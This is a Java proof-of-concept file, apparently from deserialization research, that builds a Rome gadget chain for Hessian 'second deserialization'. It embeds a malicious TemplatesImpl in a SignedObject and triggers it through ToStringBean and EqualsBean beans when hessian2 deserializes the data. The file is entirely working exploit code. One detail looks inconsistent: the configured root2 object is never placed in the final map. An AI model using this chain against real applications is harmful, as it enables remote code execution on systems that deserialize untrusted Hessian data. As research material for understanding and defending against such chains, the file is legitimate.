package org.su18.serialize.hessian.Rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.su18.serialize.utils.ClassUtil;
import org.su18.serialize.utils.HessianUtils;
import org.su18.serialize.utils.SerializeUtil;

import javax.sql.rowset.BaseRowSet;
import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.security.*;
import java.util.HashMap;

/**
 * Rome 二次反序列化
 *
 * @author su18
 */
public class Rome2 {

	public static void main(String[] args) throws Exception {

		// ysoserial rome 反序列化链
		TemplatesImpl           tmpl     = SerializeUtil.generateTemplatesImpl();
		ObjectBean              delegate = new ObjectBean(Templates.class, tmpl);
		ObjectBean              root     = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "su18"));
		HashMap<Object, Object> map      = new HashMap<>();
		map.put(root, "su18");
		map.put("su19", "su20");
		Field field = ObjectBean.class.getDeclaredField("_equalsBean");
		field.setAccessible(true);
		field.set(root, new EqualsBean(ObjectBean.class, delegate));

		// 转为 byte array
		ByteArrayOutputStream b = new ByteArrayOutputStream();
		ObjectOutput          a = new ObjectOutputStream(b);
		a.writeObject(map);
		a.flush();
		a.close();

		// 创建 SignedObject 对象并写入恶意序列化数据至 content 中
		SignedObject so = (SignedObject) ClassUtil.createInstanceUnsafely(SignedObject.class);
		Field        f  = SignedObject.class.getDeclaredField("content");
		f.setAccessible(true);
		f.set(so, b.toByteArray());

		// 之前的逻辑没变
		ToStringBean item  = new ToStringBean(SignedObject.class, so);
		EqualsBean   root2 = new EqualsBean(String.class, "su18");
		HashMap      map2  = new HashMap();
		map2.put(root, "su18");
		Field f2 = EqualsBean.class.getDeclaredField("_beanClass");
		f2.setAccessible(true);
		f2.set(root2, BaseRowSet.class);
		Field f3 = EqualsBean.class.getDeclaredField("_obj");
		f3.setAccessible(true);
		f3.set(root2, item);

		byte[] baos = HessianUtils.hessianSerialize(map2, "hessian2");
		HessianUtils.hessianSerializeToObj(baos, "hessian2");
	}

}
